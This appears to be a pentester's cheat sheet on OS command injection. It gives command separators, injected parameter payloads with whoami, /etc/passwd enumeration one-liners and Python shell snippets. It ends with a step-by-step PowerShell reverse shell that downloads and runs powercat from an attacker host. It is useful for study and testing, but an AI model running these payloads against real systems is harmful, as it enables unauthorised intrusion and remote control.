# OS Command Injection
Also known as "shell injection"

OS Command Injection Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism.
Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system. Prepared commands provide a set of functions to the underlying system that cannot be changed by user input. However, these APIs and functions are often very time consuming to plan and develop. Sometimes a web application needs to address a multitude of different cases, and a set of predefined functions can be too inflexible. In these cases, web developers often tend to directly accept user input, then sanitize it. This means that user input is filtered for any command sequences that might try to change the application's behavior for malicious purposes.

















Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter for multiple commands. Alternatively, we can use URL-encoded semicolon, represented as `%3B`

Two ampersands `&&` to specify two consecutive commands.
For the Windows CMD we can also use one ampersand `&`.














Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.

Example:
`productId=8&storeId=1|whoami`
`productId=8 & whoami & storeId=1`
`productId=8 & whoami # (this is a comment) storeId=1`












How many non-root/non-service/non-daemon users are there?
`awk -F':' '{ if ($3 >= 1000 && $1 != "nobody" ) print $1 }' /etc/passwd | wc -l`

What is the [USER]'s shell set as?
`getent passwd [USER]| awk -F':' '{print $7}'`
	- eg: `getent passwd www-data | awk -F':' '{print $7}'`










## Python
import os; print(os.popen("ls -l").read())
import os; print(open("path/to/your/file.txt", "r").read())









## Windows
Tell wheter is CMD or PowerShell:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```






### Leverage command injection to achieve system access

- `Powercat` <https://github.com/besimorhino/powercat>


1. Serve `powercat.ps1` from ATTACKER MACHINE
```
python3 -m http.server
```
2. create a Netcat listener on port 4444 to catch the reverse shell
```
nc -nvlp 4444
```

3. From VICTIM
```
IEX (New-Object System.Net.Webclient).DownloadString("http://[ATTACKER IP]/powercat.ps1");powercat -c [ATTACKER IP] -p [PORT] -e powershell
```













